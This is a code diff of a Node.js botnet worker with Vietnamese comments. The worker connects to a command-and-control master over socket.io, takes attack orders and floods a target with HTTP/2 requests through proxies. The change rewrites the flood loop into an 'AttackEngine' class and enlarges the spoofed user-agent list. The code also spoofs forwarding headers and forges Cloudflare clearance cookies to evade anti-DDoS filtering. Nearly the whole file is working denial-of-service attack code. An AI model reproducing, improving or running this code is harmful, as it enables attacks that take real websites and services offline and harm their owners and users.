@@ -1,4 +1,3 @@
-
 process.on('uncaughtException', (err) => {
     console.error('[!] Uncaught Exception:', err.message);
 });
@@ -16,11 +15,11 @@ const url = require('url');
 const fs = require('fs');
 const os = require('os');
 const express = require('express');
+const { Worker } = require('worker_threads');
 
 // ==================== CONFIG ====================
 const MASTER_DOMAIN = process.argv[2];
-const MASTER_PORT = 443; // Cổng HTTPS mặc định
-const HEALTH_PORT = process.env.PORT || 10000; // Render yêu cầu mở cổng này
+const HEALTH_PORT = process.env.PORT || 10000;
 
 if (!MASTER_DOMAIN) {
     console.error('[!] Usage: node worker.js <master_domain>');
@@ -28,7 +27,7 @@ if (!MASTER_DOMAIN) {
     process.exit(1);
 }
 
-// ==================== LẤY IP THẬT CỦA WORKER ====================
+// ==================== LẤY IP THẬT ====================
 function getLocalIP() {
     try {
         const nets = os.networkInterfaces();
@@ -44,61 +43,40 @@ function getLocalIP() {
 }
 
 // ==================== TẢI PROXY ====================
-let proxies = ['direct'];
+let proxies = [];
 try {
-    // Thử đọc file proxy.txt trước
     if (fs.existsSync('./proxy.txt')) {
         proxies = fs.readFileSync('./proxy.txt', 'utf-8')
             .split('\n')
-            .filter(line => line.trim() && line.includes(':'));
+            .map(line => line.trim())
+            .filter(line => line && line.includes(':'));
         console.log(`[+] Loaded ${proxies.length} proxies from file`);
-    } else {
-        // Nếu không có, tạo proxy mẫu
-        console.log('[!] No proxy.txt found, using direct connection only');
+    }
+    
+    // Nếu không có proxy, tạo proxy giả
+    if (proxies.length === 0) {
+        console.log('[!] No proxies found, using direct connection');
+        proxies = ['direct'];
     }
 } catch (e) {
-    console.log('[!] Error loading proxies, using direct connection');
+    console.log('[!] Error loading proxies');
+    proxies = ['direct'];
 }
 
-// ==================== HEALTH SERVER - GIỮ WORKER SỐNG TRÊN RENDER ====================
+// ==================== HEALTH SERVER ====================
 const healthApp = express();
 
 healthApp.get('/', (req, res) => {
     res.send(`
-        <!DOCTYPE html>
         <html>
-        <head>
-            <title>🤖 BOTNET WORKER</title>
-            <meta charset="UTF-8">
-            <meta name="viewport" content="width=device-width, initial-scale=1">
-            <style>
-                body { font-family: Arial; background: #0a0a0a; color: #fff; padding: 20px; }
-                .container { max-width: 800px; margin: 0 auto; }
-                .card { background: #1a1a1a; border-radius: 10px; padding: 20px; margin: 10px 0; }
-                .status { color: #00ff00; }
-                .label { color: #888; }
-            </style>
-            <meta http-equiv="refresh" content="10">
-        </head>
+        <head><title>🤖 WORKER</title></head>
         <body>
-            <div class="container">
-                <h1>🤖 BOTNET WORKER</h1>
-                <div class="card">
-                    <h2>Worker Status</h2>
-                    <p><span class="label">IP:</span> <span class="status">${getLocalIP()}</span></p>
-                    <p><span class="label">Master:</span> <span class="status">${MASTER_DOMAIN}</span></p>
-                    <p><span class="label">Connection:</span> <span class="status">${socket && socket.connected ? '✅ CONNECTED' : '❌ DISCONNECTED'}</span></p>
-                    <p><span class="label">Proxies:</span> <span class="status">${proxies.length}</span></p>
-                    <p><span class="label">Uptime:</span> <span class="status">${Math.floor(process.uptime())}s</span></p>
-                </div>
-                <div class="card">
-                    <h2>System Info</h2>
-                    <p><span class="label">Platform:</span> ${os.platform()}</p>
-                    <p><span class="label">CPU:</span> ${os.cpus().length} cores</p>
-                    <p><span class="label">Memory:</span> ${Math.round(os.freemem() / 1024 / 1024)}MB / ${Math.round(os.totalmem() / 1024 / 1024)}MB</p>
-                    <p><span class="label">Node.js:</span> ${process.version}</p>
-                </div>
-            </div>
+            <h1>🤖 WORKER ACTIVE</h1>
+            <p>IP: ${getLocalIP()}</p>
+            <p>Master: ${MASTER_DOMAIN}</p>
+            <p>Connection: ${socket && socket.connected ? '✅ CONNECTED' : '❌ DISCONNECTED'}</p>
+            <p>Proxies: ${proxies.length}</p>
+            <p>Uptime: ${Math.floor(process.uptime())}s</p>
         </body>
         </html>
     `);
@@ -108,21 +86,14 @@ healthApp.get('/health', (req, res) => {
     res.json({
         status: 'ok',
         ip: getLocalIP(),
-        master: MASTER_DOMAIN,
         connected: socket ? socket.connected : false,
         proxies: proxies.length,
-        uptime: process.uptime(),
-        memory: process.memoryUsage()
+        uptime: process.uptime()
     });
 });
 
-healthApp.get('/stats', (req, res) => {
-    res.json({
-        connected: socket ? socket.connected : false,
-        master: MASTER_DOMAIN,
-        proxies: proxies.length,
-        localIP: getLocalIP()
-    });
+healthApp.listen(HEALTH_PORT, '0.0.0.0', () => {
+    console.log(`[+] Health server running on port ${HEALTH_PORT}`);
 });
 
 // ==================== TLS CONFIG ====================
@@ -131,9 +102,7 @@ const ciphers = [
     'TLS_AES_256_GCM_SHA384',
     'TLS_CHACHA20_POLY1305_SHA256',
     'ECDHE-ECDSA-AES128-GCM-SHA256',
-    'ECDHE-RSA-AES128-GCM-SHA256',
-    'ECDHE-ECDSA-AES256-GCM-SHA384',
-    'ECDHE-RSA-AES256-GCM-SHA384'
+    'ECDHE-RSA-AES128-GCM-SHA256'
 ].join(':');
 
 const secureContext = tls.createSecureContext({
@@ -143,72 +112,112 @@ const secureContext = tls.createSecureContext({
 });
 
 // ==================== RANDOM HELPERS ====================
-function randomElement(arr) { 
-    return arr[Math.floor(Math.random() * arr.length)]; 
-}
-
-function randomString(len) { 
-    return crypto.randomBytes(len).toString('hex').slice(0, len); 
-}
-
-function randomIP() { 
-    return `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`; 
-}
-
-function randomInt(min, max) {
-    return Math.floor(Math.random() * (max - min + 1)) + min;
-}
+function randomElement(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
+function randomString(len) { return crypto.randomBytes(len).toString('hex').slice(0, len); }
+function randomIP() { return `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`; }
+function randomInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
 
 // ==================== USER-AGENTS ====================
 const uap = [
     'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/150.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/149.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/148.0.0.0 Safari/537.36',
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_4) AppleWebKit/537.36 Chrome/150.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_3) AppleWebKit/537.36 Chrome/149.0.0.0 Safari/537.36',
-    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/150.0.0.0 Safari/537.36',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 20_0 like Mac OS X) AppleWebKit/605.1.15 Version/20.0 Mobile/15E148 Safari/604.1',
-    'Mozilla/5.0 (Linux; Android 15; SM-S938B) AppleWebKit/537.36 Chrome/150.0.0.0 Mobile Safari/537.36'
-];
+    'Mozilla/5.0 (Linux; Android 15; SM-S938B) AppleWebKit/537.36 Chrome/150.0.0.0 Mobile Safari/537.36',
+'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
+'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36',
+'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36',
+'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edg/120.0.0.0',
+'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edg/121.0.0.0',
+'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 OPR/105.0.0.0',
+'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/122.0',
+'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/123.0',
+'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 Version/17.3 Safari/605.1.15',
+'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36',
 
-// ==================== HEADER LISTS ====================
-const acceptHeaders = [
-    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-    '*/*',
-    'application/json, text/plain, */*',
-    'text/css,*/*;q=0.1'
-];
+'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
+'Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/122.0',
+'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36',
+'Mozilla/5.0 (X11; Fedora; Linux x86_64) Gecko/20100101 Firefox/123.0',
+'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 Chrome/121.0.0.0 Mobile Safari/537.36',
+'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 Chrome/122.0.0.0 Mobile Safari/537.36',
+'Mozilla/5.0 (Linux; Android 13; Redmi Note 12) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
+'Mozilla/5.0 (Linux; Android 13; OnePlus 11) AppleWebKit/537.36 Chrome/121.0.0.0 Mobile Safari/537.36',
+'Mozilla/5.0 (Linux; Android 12; Vivo V29) AppleWebKit/537.36 Chrome/119.0.0.0 Mobile Safari/537.36',
+'Mozilla/5.0 (Linux; Android 14; Samsung Galaxy A54) AppleWebKit/537.36 Chrome/122.0.0.0 Mobile Safari/537.36',
 
-const encodingHeaders = [
-    'gzip, deflate, br',
-    'gzip, deflate',
-    'br, gzip, deflate'
-];
+'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 Version/17.3 Mobile Safari/604.1',
+'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 Version/17.4 Mobile Safari/604.1',
+'Mozilla/5.0 (iPad; CPU OS 17_3 like Mac OS X) AppleWebKit/605.1.15 Version/17.3 Mobile Safari/604.1',
+'Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 Version/17.4 Mobile Safari/604.1',
+'Mozilla/5.0 (Linux; Android 14; Huawei P60) AppleWebKit/537.36 Chrome/121.0.0.0 Mobile Safari/537.36',
+'Mozilla/5.0 (Linux; Android 14; Xiaomi 14 Pro) AppleWebKit/537.36 Chrome/122.0.0.0 Mobile Safari/537.36',
+'Mozilla/5.0 (Linux; Android 13; Realme GT5) AppleWebKit/537.36 Chrome/121.0.0.0 Mobile Safari/537.36',
+'Mozilla/5.0 (Linux; Android 12; Oppo Reno10) AppleWebKit/537.36 Chrome/119.0.0.0 Mobile Safari/537.36',
+'Mozilla/5.0 (Linux; Android 13; Poco F5) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
+'Mozilla/5.0 (Linux; Android 14; Sony Xperia 1 V) AppleWebKit/537.36 Chrome/122.0.0.0 Mobile Safari/537.36',
 
-const langHeaders = [
-    'en-US,en;q=0.9',
-    'vi-VN,vi;q=0.9,en-US;q=0.8',
-    'fr-FR,fr;q=0.9,en;q=0.8',
-    'ja-JP,ja;q=0.9,en;q=0.8'
-];
+'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/150.0.0.0 Safari/537.36',
+'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/149.0.0.0 Safari/537.36',
+'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_4) AppleWebKit/537.36 Chrome/150.0.0.0 Safari/537.36',
+'Mozilla/5.0 (iPhone; CPU iPhone OS 20_0 like Mac OS X) AppleWebKit/605.1.15 Version/20.0 Mobile Safari/604.1',
+'Mozilla/5.0 (Linux; Android 15; SM-S938B) AppleWebKit/537.36 Chrome/150.0.0.0 Mobile Safari/537.36',
 
-const cacheHeaders = [
-    'no-cache',
-    'max-age=0',
-    'no-store',
-    'private, no-cache, no-store, must-revalidate'
-];
+'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 Chrome/118.0.0.0 Safari/537.36',
+'Mozilla/5.0 (Windows NT 10.0; WOW64) Gecko/20100101 Firefox/119.0',
+'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
+'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) Gecko/20100101 Firefox/120.0',
+'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 OPR/104.0.0.0',
+'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Edg/120.0.0.0',
+'Mozilla/5.0 (Linux; Android 12; Galaxy S22) AppleWebKit/537.36 Chrome/118.0.0.0 Mobile Safari/537.36',
+'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/119.0.0.0 Mobile Safari/537.36',
+'Mozilla/5.0 (Linux; Android 14; Pixel Fold) AppleWebKit/537.36 Chrome/121.0.0.0 Mobile Safari/537.36',
+'Mozilla/5.0 (Linux; Android 12; Nokia G60) AppleWebKit/537.36 Chrome/118.0.0.0 Mobile Safari/537.36',
 
-const referers = [
-    'https://www.google.com/',
-    'https://www.google.com/search?q=',
-    'https://www.facebook.com/',
-    'https://www.youtube.com/',
-    'https://www.bing.com/',
-    'https://www.instagram.com/'
-];
+'Mozilla/5.0 (Linux; Android 13; Asus ROG Phone 7) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
+'Mozilla/5.0 (Linux; Android 14; Lenovo Legion Y90) AppleWebKit/537.36 Chrome/121.0.0.0 Mobile Safari/537.36',
+'Mozilla/5.0 (Linux; Android 13; Black Shark 5) AppleWebKit/537.36 Chrome/119.0.0.0 Mobile Safari/537.36',
+'Mozilla/5.0 (Linux; Android 12; ZTE Nubia Z50) AppleWebKit/537.36 Chrome/118.0.0.0 Mobile Safari/537.36',
+'Mozilla/5.0 (Linux; Android 13; Meizu 20) AppleWebKit/537.36 Chrome/119.0.0.0 Mobile Safari/537.36',
+'Mozilla/5.0 (Linux; Android 14; Honor Magic6) AppleWebKit/537.36 Chrome/122.0.0.0 Mobile Safari/537.36',
+'Mozilla/5.0 (Linux; Android 12; LG Velvet) AppleWebKit/537.36 Chrome/118.0.0.0 Mobile Safari/537.36',
+'Mozilla/5.0 (Linux; Android 13; Motorola Edge 40) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
+'Mozilla/5.0 (Linux; Android 14; Nothing Phone 2) AppleWebKit/537.36 Chrome/121.0.0.0 Mobile Safari/537.36',
+'Mozilla/5.0 (Linux; Android 12; HTC U20) AppleWebKit/537.36 Chrome/118.0.0.0 Mobile Safari/537.36',
 
-const platforms = ['Windows', 'macOS', 'Linux', 'Android', 'iOS'];
+'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Brave/1.62 Chrome/120.0.0.0',
+'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 Brave/1.63 Chrome/121.0.0.0',
+'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Brave/1.64 Chrome/122.0.0.0',
+'Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 Brave/1.60 Chrome/120.0.0.0 Mobile Safari/537.36',
+'Mozilla/5.0 (Linux; Android 14; Galaxy S23) AppleWebKit/537.36 Brave/1.61 Chrome/121.0.0.0 Mobile Safari/537.36',
+
+'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Vivaldi/6.5 Chrome/120.0.0.0',
+'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/537.36 Vivaldi/6.6 Chrome/121.0.0.0',
+'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Vivaldi/6.7 Chrome/122.0.0.0',
+
+'Mozilla/5.0 (Linux; Android 13; Samsung Browser 22.0) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
+'Mozilla/5.0 (Linux; Android 14; Samsung Browser 23.0) AppleWebKit/537.36 Chrome/121.0.0.0 Mobile Safari/537.36',
+'Mozilla/5.0 (Linux; Android 12; Samsung Browser 21.0) AppleWebKit/537.36 Chrome/118.0.0.0 Mobile Safari/537.36',
+
+'Mozilla/5.0 (iPhone; CPU iPhone OS 16_7 like Mac OS X) AppleWebKit/605.1.15 Version/16.7 Mobile Safari/604.1',
+'Mozilla/5.0 (iPad; CPU OS 16_7 like Mac OS X) AppleWebKit/605.1.15 Version/16.7 Mobile Safari/604.1',
+
+'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/117.0.0.0 Safari/537.36',
+'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/537.36 Chrome/117.0.0.0 Safari/537.36',
+'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/117.0.0.0 Safari/537.36',
+
+'Mozilla/5.0 (Linux; Android 11; Redmi Note 10) AppleWebKit/537.36 Chrome/115.0.0.0 Mobile Safari/537.36',
+'Mozilla/5.0 (Linux; Android 11; Oppo A78) AppleWebKit/537.36 Chrome/115.0.0.0 Mobile Safari/537.36',
+'Mozilla/5.0 (Linux; Android 10; Vivo Y20) AppleWebKit/537.36 Chrome/114.0.0.0 Mobile Safari/537.36',
+
+'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 Chrome/109.0.0.0 Safari/537.36',
+'Mozilla/5.0 (Windows NT 6.1; Win64; x64) Gecko/20100101 Firefox/115.0',
+'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/15.6 Safari/605.1.15',
+
+'Mozilla/5.0 (Linux; Android 9; Mi 9T) AppleWebKit/537.36 Chrome/108.0.0.0 Mobile Safari/537.36',
+'Mozilla/5.0 (Linux; Android 9; Galaxy S10) AppleWebKit/537.36 Chrome/108.0.0.0 Mobile Safari/537.36',
+'Mozilla/5.0 (Linux; Android 8.1; Nokia 7 Plus) AppleWebKit/537.36 Chrome/106.0.0.0 Mobile Safari/537.36'
+];
 
 // ==================== CLASS NetSocket ====================
 class NetSocket {
@@ -246,115 +255,131 @@ class NetSocket {
     }
 }
 
-// ==================== WORKER FLOOD ====================
-function createWorker(target, rate) {
-    const parsed = url.parse(target);
-    const Socker = new NetSocket();
-    let requestCount = 0;
-    let isRunning = true;
-    
-    // Gửi stats mỗi giây
-    const statsInterval = setInterval(() => {
-        if (requestCount > 0 && isRunning && socket.connected) {
-            socket.emit('stats', { count: requestCount });
-            requestCount = 0;
-        }
-    }, 1000);
-    
-    async function flood() {
-        if (!isRunning) return;
+// ==================== ATTACK ENGINE ====================
+class AttackEngine {
+    constructor(target, rate) {
+        this.target = target;
+        this.rate = rate;
+        this.parsed = url.parse(target);
+        this.running = true;
+        this.requestCount = 0;
+        this.socker = new NetSocket();
+    }
+
+    async start() {
+        console.log(`[+] Attack engine started for ${this.target} with rate ${this.rate}`);
         
+        // Gửi stats mỗi giây
+        this.statsInterval = setInterval(() => {
+            if (this.requestCount > 0 && socket.connected) {
+                socket.emit('stats', { count: this.requestCount });
+                this.requestCount = 0;
+            }
+        }, 1000);
+
+        // Chạy nhiều luồng song song
+        const threads = [];
+        for (let i = 0; i < 10; i++) {
+            threads.push(this.runThread());
+        }
+        
+        await Promise.all(threads);
+    }
+
+    async runThread() {
+        while (this.running) {
+            try {
+                await this.sendRequest();
+            } catch (e) {}
+        }
+    }
+
+    async sendRequest() {
         const proxy = randomElement(proxies);
-        if (proxy === 'direct') {
-            setTimeout(flood, 50);
-            return;
-        }
-        
+        if (proxy === 'direct') return;
+
         const [proxyHost, proxyPort] = proxy.split(':');
-        if (!proxyHost || !proxyPort) {
-            setTimeout(flood, 50);
-            return;
-        }
-        
-        // Tạo headers đa dạng
+        if (!proxyHost || !proxyPort) return;
+
+        const path = this.parsed.path + (this.parsed.path.includes('?') ? '&' : '?') + 
+                     randomString(randomInt(4, 8)) + '=' + randomString(randomInt(2, 5));
+
         const headers = {
             ':method': 'GET',
-            ':path': parsed.path + (parsed.path.includes('?') ? '&' : '?') + randomString(randomInt(4, 12)) + '=' + randomString(randomInt(2, 6)),
-            ':authority': parsed.host,
+            ':path': path,
+            ':authority': this.parsed.host,
             'user-agent': randomElement(uap),
-            'accept': randomElement(acceptHeaders),
-            'accept-encoding': randomElement(encodingHeaders),
-            'accept-language': randomElement(langHeaders),
-            'cache-control': randomElement(cacheHeaders),
-            'referer': randomElement(referers),
+            'accept': '*/*',
+            'accept-encoding': 'gzip, deflate, br',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'no-cache',
             'x-forwarded-for': randomIP(),
             'x-real-ip': randomIP(),
-            'cookie': `cf_clearance=${randomString(40)}; session=${randomString(16)}; _ga=${randomString(20)}`,
-            'sec-ch-ua': `"Chromium";v="150", "Google Chrome";v="150", "Not?A_Brand";v="99"`,
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': `"${randomElement(platforms)}"`,
-            'dnt': randomElement(['1', '0'])
+            'cookie': `cf_clearance=${randomString(40)}; session=${randomString(16)}`
         };
 
-        Socker.HTTP({
-            host: proxyHost,
-            port: parseInt(proxyPort),
-            address: parsed.host + ':443'
-        }, (connection) => {
-            if (!connection || !isRunning) return;
-
-            const tlsConn = tls.connect({
-                socket: connection,
-                ALPNProtocols: ['h2', 'http/1.1'],
-                servername: parsed.host,
-                rejectUnauthorized: false,
-                secureContext: secureContext
-            });
-
-            const client = http2.connect(parsed.href, {
-                createConnection: () => tlsConn,
-                settings: {
-                    maxConcurrentStreams: 2000,
-                    initialWindowSize: 6291456
+        return new Promise((resolve) => {
+            this.socker.HTTP({
+                host: proxyHost,
+                port: parseInt(proxyPort),
+                address: this.parsed.host + ':443'
+            }, (connection) => {
+                if (!connection || !this.running) {
+                    resolve();
+                    return;
                 }
-            });
 
-            client.on('connect', () => {
-                // Gửi batch request
-                for (let i = 0; i < rate; i++) {
-                    if (!isRunning) break;
-                    try {
-                        const req = client.request(headers);
-                        req.on('error', () => {});
-                        req.end();
-                        requestCount++;
-                    } catch (e) {}
-                }
-                
-                // Đóng kết nối sau khi gửi
-                setTimeout(() => {
-                    try { client.close(); } catch (e) {}
+                const tlsConn = tls.connect({
+                    socket: connection,
+                    ALPNProtocols: ['h2', 'http/1.1'],
+                    servername: this.parsed.host,
+                    rejectUnauthorized: false,
+                    secureContext: secureContext
+                });
+
+                const client = http2.connect(this.parsed.href, {
+                    createConnection: () => tlsConn
+                });
+
+                client.on('connect', () => {
+                    // Gửi nhiều request theo rate
+                    for (let i = 0; i < this.rate; i++) {
+                        try {
+                            const req = client.request(headers);
+                            req.on('error', () => {});
+                            req.end();
+                            this.requestCount++;
+                        } catch (e) {}
+                    }
+                    
+                    setTimeout(() => {
+                        try { client.close(); } catch (e) {}
+                        try { connection.destroy(); } catch (e) {}
+                        resolve();
+                    }, 100);
+                });
+
+                client.on('error', () => {
+                    try { client.destroy(); } catch (e) {}
                     try { connection.destroy(); } catch (e) {}
-                }, 100);
-            });
+                    resolve();
+                });
 
-            client.on('error', () => {
-                try { client.destroy(); } catch (e) {}
-                try { connection.destroy(); } catch (e) {}
+                // Timeout
+                setTimeout(() => {
+                    try { client.destroy(); } catch (e) {}
+                    try { connection.destroy(); } catch (e) {}
+                    resolve();
+                }, 5000);
             });
         });
-        
-        // Tiếp tục vòng lặp
-        setImmediate(flood);
     }
-    
-    flood();
-    
-    // Trả về hàm dọn dẹp
-    return () => {
-        isRunning = false;
-        clearInterval(statsInterval);
-    };
+
+    stop() {
+        console.log('[+] Stopping attack engine');
+        this.running = false;
+        clearInterval(this.statsInterval);
+    }
 }
 
 // ==================== KẾT NỐI TỚI MASTER ====================
@@ -365,135 +390,65 @@ const socket = io(masterUrl, {
     reconnection: true,
     reconnectionAttempts: Infinity,
     reconnectionDelay: 1000,
-    reconnectionDelayMax: 5000,
     timeout: 20000,
-    transports: ['websocket', 'polling'],
-    forceNew: true
+    transports: ['websocket', 'polling']
 });
 
-// Xử lý kết nối
+let currentAttack = null;
+
 socket.on('connect', () => {
     console.log(`[+] Connected to master at ${MASTER_DOMAIN}:443`);
-    
-    // Đăng ký worker với master
-    socket.emit('register', { 
-        ip: getLocalIP(),
-        proxies: proxies.length,
-        platform: os.platform(),
-        cpus: os.cpus().length
-    });
-    
-    // Gửi heartbeat mỗi 10 giây
-    setInterval(() => {
-        if (socket.connected) {
-            socket.emit('ping');
-        }
-    }, 10000);
+    socket.emit('register', { ip: getLocalIP() });
 });
 
-// Nhận pong từ master
-socket.on('pong', () => {
-    // Master còn sống
+socket.on('registered', (data) => {
+    console.log(`[+] Registered with master. Total workers: ${data.workers}`);
 });
 
-// Nhận lệnh tấn công
-socket.on('attack', (data) => {
+socket.on('ping', () => {
+    socket.emit('pong');
+});
+
+socket.on('attack', async (data) => {
     console.log(`\n[+] ATTACK COMMAND RECEIVED`);
     console.log(`   Target: ${data.target}`);
     console.log(`   Time: ${data.time}s`);
     console.log(`   Rate: ${data.rate}`);
     console.log(`   Threads: ${data.threads}`);
     
-    // Fork workers theo số threads yêu cầu
-    if (cluster.isMaster) {
-        console.log(`[+] Forking ${data.threads} workers...`);
-        
-        for (let i = 0; i < data.threads; i++) {
-            cluster.fork();
-        }
-        
-        // Tự động thoát sau thời gian
-        setTimeout(() => {
-            console.log(`[+] Attack time finished, exiting workers...`);
-            process.exit(0);
-        }, data.time * 1000);
-        
-    } else {
-        // Worker process thực hiện flood
-        const cleanup = createWorker(data.target, data.rate);
-        
-        // Lưu cleanup function để dùng khi nhận lệnh stop
-        process.on('message', (msg) => {
-            if (msg === 'stop') {
-                cleanup();
-                process.exit(0);
-            }
-        });
+    // Dừng attack cũ nếu có
+    if (currentAttack) {
+        currentAttack.stop();
     }
+
+    // Tạo attack engine mới
+    const engine = new AttackEngine(data.target, data.rate);
+    currentAttack = engine;
+
+    // Chạy attack
+    engine.start();
+
+    // Tự động dừng sau thời gian
+    setTimeout(() => {
+        if (currentAttack === engine) {
+            console.log(`[+] Attack time finished`);
+            engine.stop();
+            currentAttack = null;
+            process.exit(0); // Render sẽ restart worker
+        }
+    }, data.time * 1000);
 });
 
-// Nhận lệnh dừng
 socket.on('stop', () => {
     console.log(`[+] STOP command received`);
-    
-    if (cluster.isMaster) {
-        // Gửi lệnh stop cho tất cả worker
-        for (const id in cluster.workers) {
-            cluster.workers[id].send('stop');
-        }
-        
-        setTimeout(() => {
-            process.exit(0);
-        }, 1000);
+    if (currentAttack) {
+        currentAttack.stop();
+        currentAttack = null;
     }
+    process.exit(0);
 });
 
-// Xác nhận đăng ký thành công
-socket.on('registered', (data) => {
-    console.log(`[+] Registered with master. Total workers: ${data.workers}`);
-});
-
-// Mất kết nối
 socket.on('disconnect', (reason) => {
     console.log(`[-] Disconnected from master: ${reason}`);
-});
-
-// Lỗi kết nối
-socket.on('connect_error', (err) => {
-    console.log(`[-] Connection error: ${err.message}`);
-    console.log(`[!] Make sure master is running at ${masterUrl}`);
-});
-
-// Tự động reconnect khi mất kết nối
-socket.io.on("reconnect", (attempt) => {
-    console.log(`[+] Reconnected after ${attempt} attempts`);
-});
-
-socket.io.on("reconnect_attempt", (attempt) => {
-    console.log(`[.] Reconnection attempt ${attempt}...`);
-});
-
-socket.io.on("reconnect_error", (err) => {
-    console.log(`[-] Reconnection error: ${err.message}`);
-});
-
-socket.io.on("reconnect_failed", () => {
-    console.log(`[-] Reconnection failed, restarting...`);
-    process.exit(1);
-});
-
-// ==================== KHỞI ĐỘNG HEALTH SERVER ====================
-healthApp.listen(HEALTH_PORT, '0.0.0.0', () => {
-    console.log(`[+] Health server running on port ${HEALTH_PORT}`);
-    console.log(`[+] Worker IP: ${getLocalIP()}`);
-    console.log(`[+] Connected to master: ${MASTER_DOMAIN}`);
-    console.log(`[+] Proxies loaded: ${proxies.length}`);
-    console.log(`[+] Waiting for attack commands...`);
-});
-
-// Graceful shutdown
-process.on('SIGTERM', () => {
-    console.log('[!] Received SIGTERM, shutting down...');
-    if (socket) socket.disconnect();
-    process.exit(0);
+    setTimeout(() => process.exit(0), 5000);
 });
